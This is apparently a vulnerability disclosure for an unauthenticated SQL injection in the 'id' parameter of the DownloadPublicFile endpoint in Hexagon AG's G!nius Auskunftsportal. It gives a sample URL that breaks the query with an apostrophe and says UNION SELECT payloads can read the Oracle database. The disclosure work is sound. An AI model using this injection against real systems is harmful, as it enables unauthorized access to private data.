------------------------------------------
[Vulnerability Type]
SQL Injection
------------------------------------------
[Vendor of Product]
Hexagon AG
------------------------------------------
[Affected Product Code Base]
G!nius Auskunftsportal - 5.0.0.0 (fixed)
------------------------------------------
[Affected Component]
DownloadPublicFile component
------------------------------------------
[Attack Type]
Remote
------------------------------------------
[Impact Information Disclosure]
true
------------------------------------------
[Attack Vectors]
The web application has a function ("DownloadPublicFile") which facilitates downloads.
The "id" parameter (used to specify which file is to be downloaded) is vulnerable to SQL injection.
This SQL injection attack surface allows the Oracle database backend to be accessed and read without authentication by using a "UNION SELECT" payload.
Accessing the following URL will trigger an Oracle error message:
https://[affected site root]/GiPWorkflow/Service/DownloadPublicFile?id=DS'
The apostrophe at the end (Unicode U+0027) interrupts the application's hard-coded SQL query.
At this point a "UNION SELECT" payload can be used to access any data within the database.
------------------------------------------
[Has vendor confirmed or acknowledged the vulnerability?]
true
A patch has been developed, released and installed to all known instances of the vulnerability a full six months prior to public disclosure.
